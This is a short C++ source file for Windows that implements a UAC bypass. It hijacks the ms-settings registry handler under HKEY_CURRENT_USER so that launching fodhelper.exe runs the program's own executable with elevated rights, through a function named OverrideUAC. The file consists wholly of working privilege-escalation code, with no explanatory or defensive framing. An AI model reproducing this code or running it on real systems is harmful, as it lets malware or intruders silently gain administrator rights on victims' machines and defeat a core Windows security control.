#include <winsock2.h>
#include <windows.h>
#include <CommCtrl.h>
#include <tchar.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <string>


std::wstring GetExecutablePath() {

    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);

}

LSTATUS SetRegValue(HKEY keyHandle, const wchar_t* valueTitle, const wchar_t* valueData) {
    return RegSetValueEx(keyHandle, valueTitle, 0, REG_SZ, (const BYTE*)valueData, (wcslen(valueData) + 1) * sizeof(wchar_t));
}

int ConfigureRegistry() {

    HKEY keyHandle;
    DWORD disposition;

    std::wstring exePath = GetExecutablePath();

    std::wstring command = L"cmd /c start \"Terminal1\" C:\\Windows\\System32\\cmd.exe /c " + exePath;

    std::wstring delegateExec = L"";

    LSTATUS status = RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0, KEY_WRITE, NULL, &keyHandle, &disposition);
    if (status != ERROR_SUCCESS) {
        wprintf(L"Failed to open or create reg key\n");
        return 1;
    }

    status = SetRegValue(keyHandle, L"", command.c_str());
    if (status != ERROR_SUCCESS) {
        wprintf(L"Failed to set reg value\n");
        RegCloseKey(keyHandle);
        return 1;
    }

    status = SetRegValue(keyHandle, L"DelegateExecute", delegateExec.c_str());
    if (status != ERROR_SUCCESS) {
        wprintf(L"Failed to set reg value: DelegateExecute\n");
        RegCloseKey(keyHandle);
        return 1;
    }

    wprintf(L"Successfully created reg key and set reg values!!\n");
    RegCloseKey(keyHandle);
    return 0;
}

int InitiateElevatedProc() {
    SHELLEXECUTEINFO execInfo = { sizeof(execInfo) };

    execInfo.lpVerb = L"runas";
    execInfo.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    execInfo.hwnd = NULL;
    execInfo.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&execInfo)) {
        DWORD errCode = GetLastError();
        wprintf(errCode == ERROR_CANCELLED ? L"user refused to allow privileges elevation!!!!" : L"error code: %ld", errCode);
        return 1;
    }
    else {
        wprintf(L"succesfully create process!!=\n");
        return 0;
    }

}

int OverrideUAC() {

    if (ConfigureRegistry() != 0) {
        return 1;

    }
    return InitiateElevatedProc();

}
